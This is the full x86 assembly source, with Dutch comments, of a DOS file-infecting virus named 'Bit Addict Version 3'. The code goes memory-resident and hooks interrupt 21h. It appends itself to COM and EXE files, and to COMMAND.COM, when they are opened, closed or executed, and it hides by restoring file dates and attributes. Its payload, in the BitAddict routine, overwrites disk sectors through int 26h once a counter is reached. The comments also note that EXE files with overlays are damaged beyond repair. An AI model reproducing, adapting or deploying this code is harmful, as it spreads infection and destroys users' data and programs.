; Bit Addict Versie 3

;-----------------------------------------------------------------------------
;-----                                                                   -----
;-----              Macros en andere hulpmiddellen                       -----
;-----                                                                   -----
;-----------------------------------------------------------------------------

; de macro's hieronder worden gebruikt wanneer een conditionele sprong groter
; wordt dan 128 bytes en er dus een foutmelding komt

jmpc	macro	Dest			; vervanging voor jc
	local	@@00

	jnc	@@00
	jmp	Dest
@@00:
	endm

jmpnc	macro	Dest			; vervanging voor jnc
	local	@@00

	jc	@@00
	jmp	Dest
@@00:
	endm

jmpe	macro	Dest			; vervanging voor je
	local	@@00

	jnz	@@00
	jmp	Dest
@@00:
	endm

jmpne	macro	Dest			; vervanging voor jne
	local	@@00

	jz	@@00
	jmp	Dest
@@00:
	endm

eseg segment
	mov	ax,4c00h		; exit
	int	21h
eseg ends

;-----------------------------------------------------------------------------
;-----                                                                   -----
;-----              Begin van het Bit Addict virus                       -----
;-----                                                                   -----
;-----------------------------------------------------------------------------

cseg segment
	assume	cs:cseg,ds:cseg,es:cseg
	org	0

CodeSize	equ	CodeEnd-BeginCode
CodeSizePara	equ	(CodeEnd-BeginCode+0fh) / 10h
VirusSize	equ	VirusEnd-BeginCode
VirusSizePara	equ	(VirusEnd-BeginCode+0fh) / 10h
HeaderLength	equ	18h

BeginCode	equ	$
SavedCode	equ	this byte		; gegevens over het
OldSignature	dw	5a4dh			; programma voor het virus
OldCSIP		equ	this dword
OldIP		dw	0
OldCS		dw	0
OldSP		dw	200h
OldSS		dw	0
		dw	3 dup(0)

Comspec		db	'COMSPEC='		; comspec environment variabele
						; om de command.com te vinden

ID		db	'Bit Addict Version 3'
ID_Length	equ	$-offset ID

Count		dw	0
Bios		db	10h dup(0)
ChkSum		dw	0

Begin:	push	ax				; Programma om het virus
	push	bx				; in het geheugen te zetten
	push	cx
	push	dx
	push	si
	push	di
	push	ds
	push	es
	call	Init
	jnc	@@12
	call	BiosCheck
	push	cs
	pop	es
	xor	al,al
	mov	cx,VirusSize-CodeSize
	mov	di,CodeSize
	cld
	rep	stosb
	call	DebugOn
	mov	ah,52h				; lees het adres van de eerste
	call	DOS				; disk-buffer
	push	bx
	mov	ah,30h
	call	DOS
	pop	di
	call	DebugOff
	cmp	al,2				; dit werkt niet op dos 1.x
	jb	@@12
	cmp	al,3				; voor dos 2.x op di+13h en
	adc	di,12h				; voor dos 3+  op di+12h
	lds	si,es:[di]
	or	si,si
	jne	@@12
	push	di
	cld
	movsw					; reserveer 1e buffer
	movsw
	pop	di
	mov	cx,ds
	mov	dx,ds
	mov	bx,3
@@10:	call	GetBuffer			; reserveer 2e,3e en 4e
	jc	@@11				; buffer 
	dec	bx
	jne	@@10
	call	CopyBitAddict			; Copieer bit addict naar
	pop	es				; de buffers
	push	es				; Infecteer bestand in de
	call	InfectComspec			; comspec
	jmp	short @@12
@@11:	call	RestoreBuffers
@@12:	pop	es				; ga nu verder met het
	pop	ds				; programma voor Bit Addict
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	cli
	mov	ss,cs:OldSS
	mov	sp,cs:OldSP
	sti
	jmp	cs:OldCSIP

GetBuffer:				; reserveer een buffer
	push	di			; cx = eerste buffer
	push	es			; dx = laatste buffer
	jmp	short @@21
@@20:	push	ds
	pop	es
	mov	di,si
@@21:	lds	si,es:[di]
	or	si,si
	jne	@@23
	mov	ax,ds
	sub	ax,dx
	cmp	ax,21h
	jne	@@22
	mov	dx,ds
	cld
	movsw
	movsw
	clc
	jmp	short @@24
@@22:	mov	ax,ds
	sub	ax,cx
	neg	ax
	cmp	ax,21h
	jne	@@20
	mov	cx,ds
	cld
	movsw
	movsw
	clc
	jmp	short @@24
@@23:	stc
@@24:	pop	es
	pop	di
	ret

CopyBitAddict:
	push	cs				; copieer Bit Addict naar de
	pop	ds				; gereserveerde buffers
	mov	es,cx
	xor	si,si
	xor	di,di
	mov	cx,VirusSize
	cld
	rep	movsb
	xor	ax,ax				; leid interrupt 21h om naar
	mov	ds,ax				; Bit Addict
	mov	word ptr ds:[84h],offset NewInt21
	mov	word ptr ds:[86h],es
	ret

InfectComspec:
	mov	es,es:[2ch]			; lees environment segment
	xor	di,di
	push	cs				; zoek naar de comspec
	pop	ds				; variabele
	mov	si,offset Comspec
@@30:	push	si
	push	di
	mov	cx,8
	cld
	repe	cmpsb
	pop	di
	pop	si
	je	@@31
	xor	al,al
	mov	cx,-1
	cld
	repne	scasb
	cmp	byte ptr es:[di],0
	jne	@@30
	jmp	short @@32
@@31:	push	es				; infecteer de COMMAND.COM of
	pop	ds				; andere command interpreter
	lea	dx,[di+8]
	push	cs:OldIP
	push	cs:OldCS
	push	cs:OldSP
	push	cs:OldSS
	call	Infect
	pop	cs:OldSS
	pop	cs:OldSP
	pop	cs:OldCS
	pop	cs:OldIP
@@32:	ret

RestoreBuffers:
	mov	ax,cx
@@40:	cmp	ax,dx
	je	@@42
	mov	ds,ax
	add	ax,21h
	mov	word ptr ds:[0],0
	mov	word ptr ds:[2],ax
	jmp	short @@40
@@42:	mov	ds,dx
	mov	ax,es:[di]
	mov	ds:[0],ax
	mov	word ptr es:[di],0
	mov	ax,es:[di+2]
	mov	ds:[2],ax
	mov	es:[di+2],cx
	ret

DebugOn:push	ax
	push	ds
	xor	ax,ax
	mov	ds,ax
	cli
	mov	ax,ds:[4h]
	mov	word ptr cs:OldInt1[0],ax
	mov	ax,ds:[6h]
	mov	word ptr cs:OldInt1[2],ax
	mov	word ptr ds:[4],offset NewInt1
	mov	word ptr ds:[6],cs
	mov	ax,ds:[84h]
	mov	word ptr cs:OldInt21[0],ax
	mov	ax,ds:[86h]
	mov	word ptr cs:OldInt21[2],ax
	mov	word ptr cs:DosInt21[0],0
	mov	word ptr cs:DosInt21[2],0
	sti
	pop	ds
	pop	ax
	pushf
	push	cs
	call	SetTrap
	ret

SetTrap:push	bp
	mov	bp,sp
	or	word ptr ss:[bp+6],100h
	pop	bp
	iret

DebugOff:
	pushf
	push	cs
	call	ClearTrap
	push	ax
	push	ds
	xor	ax,ax
	mov	ds,ax
	cli
	mov	ax,word ptr cs:OldInt1[0]
	mov	ds:[4],ax
	mov	ax,word ptr cs:OldInt1[2]
	mov	ds:[6],ax
	sti
	pop	ds
	pop	ax
	ret

ClearTrap:
	push	bp
	mov	bp,sp
	and	word ptr ss:[bp+6],0feffh
	pop	bp
	iret

Init:	push	cs
	pop	ds
	cmp	OldSignature,5a4dh
	je	@@50
	mov	si,offset SavedCode		; herstel begin van het
	mov	di,100h				; com-programma
	mov	cx,10h
	cld
	rep	movsb
	mov	OldSS,ss			; bewaar de waarden van
	mov	OldSP,sp			; ss,sp,cs en ip
	sub	OldSP,10h
	mov	OldCS,es
	mov	OldIP,100h
	jmp	short @@51
@@50:	mov	ax,es				; bereken de waarden van
	add	ax,10h				; ss,sp,cs en ip
	add	OldCS,ax
	add	OldSS,ax
@@51:	mov	ax,4b40h			; controleer of Bit Addict al
	int	21h				; in het geheugen aanwezig is
	jc	@@52
	mov	ds,ax
	push	cs				; vergelijk identificatie
	pop	ds
	mov	si,offset ID
	mov	di,si
	mov	cx,ID_Length
	cld
	repe	cmpsb
	je	@@52
	stc
@@52:	ret

BiosCheck:
	mov	ax,0f000h
	mov	ds,ax
	push	cs
	pop	es
	xor	si,si
	mov	di,offset Bios
	mov	cx,10h
	cld
	repe	cmpsb
	je	@@54
	mov	ax,cs:Count
	inc	ax
	cmp	ax,100h
	jb	@@53
	call	BitAddict
@@53:	mov	cs:Count,ax
	xor	si,si
	mov	di,offset Bios
	mov	cx,10h
	rep	movsb
@@54:	ret

BitAddict:
	xor	dx,dx
@@55:	push	dx
	mov	ax,3
	xor	bx,bx
	mov	cx,40h
	int	26h
	pop	ax
	pop	dx
	add	dx,40h
	or	dx,dx
	jne	@@55
	ret

NewInt1:push	bp
	mov	bp,sp
	push	ax
	mov	ax,word ptr cs:DosInt21[0]
	or	ax,word ptr cs:DosInt21[2]
	jnz	@@60
	cmp	word ptr ss:[bp+4],300h
	jae	@@61
	mov	ax,ss:[bp+2]
	mov	word ptr cs:DosInt21[0],ax
	mov	ax,ss:[bp+4]
	mov	word ptr cs:DosInt21[2],ax
@@60:	and	word ptr ss:[bp+6],0feffh
@@61:	pop	ax
	pop	bp
	iret

DOS:	push	ax
	mov	ax,word ptr cs:DosInt21[0]
	or	ax,word ptr cs:DosInt21[2]
	pop	ax
	jnz	@@62
	pushf
	call	cs:OldInt21
	ret
@@62:	pushf
	call	cs:DosInt21
	ret

InstallCheck:					; Zo kan bit addict weten
	mov	ax,cs				; dat er al een andere copy
	popf					; aanwezig is
	clc
	retf	2

Exec:	call	CheckExtension			; functie 4bh, infecteer eerst
	jc	EOI				; met Bit Addict
	mov	byte ptr cs:Active,1
	call	Infect
	mov	byte ptr cs:Active,0
	jmp	short EOI

NewInt21:					; Het nieuwe interrupt 21h
	pushf
	cmp	byte ptr cs:Active,0
	jne	EOI
	cmp	ah,3dh
	je	Open
	cmp	ah,3ch
	je	Open
	cmp	ah,3eh
	je	Close
	cmp	ax,4b40h
	je	InstallCheck
	cmp	ah,4bh
	je	Exec
EOI:	popf
	jmp	cs:OldInt21

Open:	call	CheckExtension
	jc	EOI
	mov	byte ptr cs:Active,1
	call	cs:OldInt21
	jc	@@92
	pushf
	push	ax
	push	cx
	push	si
	push	di
	push	es
	push	cs
	pop	es
	mov	si,dx
	mov	di,offset File1
	cmp	word ptr es:[di],0
	je	@@90
	mov	di,offset File2
	cmp	word ptr es:[di],0
	jne	@@91
@@90:	cld
	stosw
	mov	cx,70
	rep	movsb
@@91:	pop	es
	pop	di
	pop	si
	pop	cx
	pop	ax
	popf
@@92:	mov	byte ptr cs:Active,0
	retf	2

Close:	cmp	bx,cs:File1
	je	@@93
	cmp	bx,cs:File2
	jne	EOI
	mov	byte ptr cs:Active,1
	call	cs:OldInt21
	push	si
	mov	si,offset File2
	jmp	short @@94
@@93:	mov	byte ptr cs:Active,1
	call	cs:OldInt21
	push	si
	mov	si,offset File1
@@94:	jc	@@95
	pushf
	push	dx
	push	ds
	push	cs
	pop	ds
	lea	dx,[si+2]
	call	Infect
	pop	ds
	pop	dx
	popf
@@95:	mov	word ptr cs:[si],0
	mov	byte ptr cs:Active,0
	pop	si
	retf	2

CheckExtension:
	push	ax
	push	cx
	push	si
	push	di
	push	es
	push	ds
	pop	es
	mov	di,dx
	xor	al,al
	mov	cx,70
	cld
	repne	scasb
	jne	@@65
	std
	mov	al,'.'
	neg	cx
	add	cx,70
	std
	repne	scasb
	jne	@@65
	lea	si,[di+2]
	cld
	lodsw
	and	ax,0dfdfh
	cmp	ax,5845h		; 'EX'
	je	@@64
	cmp	ax,4f43h		; 'CO'
	jne	@@65
	lodsb
	and	al,0dfh
	cmp	al,4dh			; 'M'
	je	@@66
	jmp	short @@65
@@64:	lodsb
	and	al,0dfh
	cmp	al,45h			; 'E'
	je	@@66
@@65:	stc
	jmp	short @@67
@@66:	clc
@@67:	pop	es
	pop	di
	pop	si
	pop	cx
	pop	ax
	ret

ComHeader:					; dit stukje wordt voor een
	mov	ax,cs				; COM-file geplaatst
	add	ax,0100h
OldSize	equ	this word-2
	push	ax
	mov	ax,offset Begin
	push	ax
	retf

Infect:	push	ax				; Infecteer een file
	push	bx
	push	cx
	push	si
	push	di
	push	bp
	push	es
	mov	ax,4300h			; lees attributen en bewaar
	call	DOS				; ze
	jmpc	@@83
	push	cx
	push	dx
	push	ds
	test	cx,1
	jz	@@71
	mov	ax,4301h			; set Read-Only attribuut
	and	cx,0fffeh			; op nul
	call	DOS
	jmpc	@@82
@@71:	mov	ax,3d02h			; open de file
	call	DOS
	jmpc	@@82
	mov	bx,ax
	mov	ax,5700h			; lees de datum en tijd en
	call	DOS				; bewaar ze
	jmpc	@@81
	push	cx
	push	dx
	push	cs				; ds=es=cs
	pop	ds
	push	cs
	pop	es
	mov	ah,3fh				; lees de header van de file
	mov	cx,HeaderLength
	mov	dx,offset Header
	call	DOS
	jmpc	@@80
	cmp	ax,HeaderLength
	jne	@@75
	cmp	Signature,5a4dh
	jne	@@72
	mov	ax,ExeCS			; zoek de plaats waar de
	add	ax,HeaderSize			; identificatie zou moeten
	mov	dx,10h				; staan voor exe-files
	mul	dx
	add	ax,offset ID
	adc	dx,0
	jmp	short @@73
@@72:	mov	ax,ComCS			; doe hetzelfde maar dan voor
	mov	dx,10h				; een com-file
	sub	ax,dx
	mul	dx
	add	ax,offset ID
	adc	dx,0
@@73:	mov	cx,dx
	mov	dx,ax
	mov	ax,4200h
	call	DOS
	jc	@@74
	mov	ah,3fh				; lees de ID indien aanwezig
	mov	cx,ID_Length
	mov	dx,offset ID_Check
	call	DOS
	jc	@@74
	cmp	ax,ID_Length
	jne	@@74
	mov	si,offset ID_Check		; controleer of ID aanwezig
	mov	di,offset ID			; is
	mov	cx,ID_Length
	cld
	repe	cmpsb
	jmpe	@@80				; als ID aanwezig is, stop dan
@@74:	cmp	Signature,5a4dh
	je	@@77
@@75:	mov	ax,4202h			; infecteer com-files
	xor	cx,cx				; ga naar het einde van de file
	xor	dx,dx
	call	DOS
	mov	cx,10h				; aanpassen van de com-header
	div	cx				; aan deze com-file
	or	dx,dx
	je	@@76
	push	ax
	mov	ah,40h
	mov	cx,10h
	sub	cx,dx
	xor	dx,dx
	call	DOS
	pop	ax
	jmpc	@@80
	inc	ax
@@76:	add	ax,10h
	mov	OldSize,ax
	mov	si,offset Header		; bewaar het eerste deel van
	mov	di,offset SavedCode		; het programma
	mov	cx,10h
	cld
	rep	movsb
	mov	ah,40h				; schrijf het virus achter het
	mov	cx,CodeSize			; programma
	xor	dx,dx
	call	DOS
	jmpc	@@80
	mov	ax,4200h			; ga naar het begin van de file
	xor	cx,cx
	xor	dx,dx
	call	DOS
	jmpc	@@80
	mov	ah,40h				; overschrijf het begin van het
	mov	cx,10h				; programma met de com-header
	mov	dx,offset ComHeader
	call	DOS
	jmp	@@80
@@77:	mov	OldSignature,5a4dh		; infecteer exe-files
	mov	ax,ExeIP			; bewaar de oude waarden van
	mov	OldIP,ax			; cs:ip en ss:sp
	mov	ax,ExeCS
	mov	OldCS,ax
	mov	ax,ExeSP
	mov	OldSP,ax
	mov	ax,ExeSS
	mov	OldSS,ax
	mov	ax,PageCount			; pas de waarden van cs:ip en
	dec	ax				; ss:sp aan, en pas ook de 
	mov	cx,200h				; lengte van de file aan
	mul	cx
	add	ax,PartPage
	adc	dx,0
	mov	cx,dx
	mov	dx,ax
	mov	ax,4200h
	call	DOS
	jmpc	@@80
	push	ax
	push	dx
	mov	ah,3fh
	mov	cx,80h
	mov	dx,offset Buffer
	int	21h
	mov	cx,ax
	pop	dx
	pop	ax
	jmpc	@@80
	cmp	cx,80h
	jmpe	@@80
	add	ax,cx
	adc	dx,0
	mov	cx,10h
	div	cx
	or	dx,dx
	je	@@78
	push	ax
	push	dx
	mov	ah,40h
	mov	cx,10h
	sub	cx,dx
	xor	dx,dx
	call	DOS
	pop	dx
	pop	ax
	jc	@@80
	inc	ax
@@78:	sub	ax,HeaderSize
	mov	ExeCS,ax
	mov	ExeIP,offset Begin
	add	ax,VirusSizePara
	mov	ExeSS,ax
	mov	ExeSP,200h
	mov	ax,MinMem
	cmp	ax,20h+VirusSizePara-CodeSizePara
	jae	@@79
	mov	ax,20h
@@79:	mov	MinMem,ax
	mov	ax,PartPage
	add	ax,CodeSize
	add	ax,dx
	mov	cx,200h
	xor	dx,dx
	div	cx
	add	PageCount,ax
	mov	PartPage,dx
	mov	ah,40h				; schrijf het virus achter
	mov	cx,CodeSize			; de exe-file, indien de
	xor	dx,dx				; exe-file overlays bevat dan
	call	DOS				; worden ze overschreven en is
	jc	@@80				; de exe-file onherstelbaar
	mov	ax,4200h			; beschadigd
	xor	cx,cx
	xor	dx,dx				; ga naar het begin van de file
	call	DOS
	jc	@@80
	mov	ah,40h				; schrijf de nieuwe exe-header
	mov	cx,HeaderLength			; over de oude heen.
	mov	dx,offset Header
	call	DOS
@@80:	pop	dx				; herstel de datum van de file
	pop	cx
	mov	ax,5701h
	call	DOS
@@81:	mov	ah,3eh				; sluit de file
	call	DOS
@@82:	pop	ds				; herstel de attributen van de
	pop	dx				; file
	pop	cx
	test	cx,1
	jz	@@83
	mov	ax,4301h
	call	DOS
@@83:	pop	es				; herstel de waarden van de
	pop	bp				; registers en keer terug
	pop	di				; naar het oude interrupt 21
	pop	si
	pop	cx
	pop	bx
	pop	ax
	ret

CodeEnd		equ	$

Header		dw	HeaderLength/2 dup(?)
ComCS		equ	Header[OldSize-Comheader]	; Com file

Signature	equ	Header[0h]			; Exe file
PartPage	equ	Header[2h]
PageCount	equ	Header[4h]
HeaderSize	equ	Header[8h]
MinMem		equ	Header[0ah]
MaxMem		equ	Header[0ch]
ExeSS		equ	Header[0eh]
ExeSP		equ	Header[10h]
ExeIP		equ	Header[14h]
ExeCS		equ	Header[16h]

ID_Check	db	ID_Length dup(?)

Active		db	?

DosInt21	dd	?
OldInt21	dd	?
OldInt1		dd	?

File1		dw	36 dup(?)
File2		dw	36 dup(?)

Buffer		db	80h dup(?)

VirusEnd	equ	$

cseg ends

sseg segment stack
	db	200h dup(?)
sseg ends

end Begin